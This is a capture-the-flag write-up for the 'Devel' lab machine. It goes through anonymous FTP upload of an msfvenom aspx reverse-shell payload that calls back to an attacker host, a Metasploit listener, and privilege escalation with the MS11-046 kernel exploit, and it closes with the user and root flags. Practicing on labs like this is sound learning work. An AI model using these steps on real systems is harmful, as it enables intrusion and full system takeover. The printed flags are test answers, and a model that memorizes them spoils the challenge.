# Devel - Easy

```shell
rustscan -a 10.10.10.5 --range 0-65535 --ulimit 5000 -- -sV

ftp 10.10.10.5
#ftp anonymous mode
#check files

feroxbuster -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent
#this shows same files as ftp

#prepare payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f aspx -o shell.aspx

ftp 10.10.10.5

put shell.aspx

#now setup listener on msfconsole
msfconsole -q

use exploit/multi/handler

options

set payload windows/meterpreter/reverse_tcp

set LHOST 10.10.14.6

set LPORT 4444

run

getuid
#IIS APPPOOL\Web

sysinfo
#x86 build

#get windows cmd
shell

systeminfo

systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
#this filters the info
#search for exploit on Google based on build info
#and download C file

#on attacker machine
i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32

#transfer .exe to victim

#in victim shell
exit
#go back to meterpreter shell
cd C:\Windows\Temp
#for upload permissions

upload ~/Tools/MS11-046.exe
#uploads .exe

shell

cd C:\Windows\Temp

dir

.\MS11-046.exe
#gives us shell as system user
#get flags
```

```markdown
Open ports & services:

  * 21 - ftp - Microsoft ftpd
  * 80 - http - Microsoft IIS httpd 7.5

Now, as ftp allows anonymous mode, we can login and check for any files.

It contains a few files such as welcome.png and iisstart.htm

Checking the webpage on port 80, it is an IIS webpage; and the home page is iisstart.htm

We can confirm this by enumerating the web directories; it shows the same files as the ones in ftp.

So we can upload our reverse-shell file in ftp, and visit the link on the webpage to get reverse shell.

As it is IIS server, we will have to create a .aspx shell using msfvenom and upload that to ftp.

Setup listener with msfconsole, before accessing the link for shell.aspx on web.

After getting reverse Meterpreter shell, we can do initial enumeration by checking user and sysinfo; we find out that it is a x86 system.

Now, by only checking OS name, version and system type, we can find out that it is 6.1.76000 build 7600.

Searching for an exploit for this system leads us to a popular exploit for x86 systems - 'afd.sys' (MS11-046).

Using this exploit for privesc is possible as we just need to compile the C program in attacker machine, upload the .exe to the victim machine and execute it.

This gives us system privileges and we can read both flags.
```

1. User flag - a04a497ac0acc4c24ae50996a5476e07

2. Root flag - 7bbc659645b86dfbcc98ee8ba1a3410f
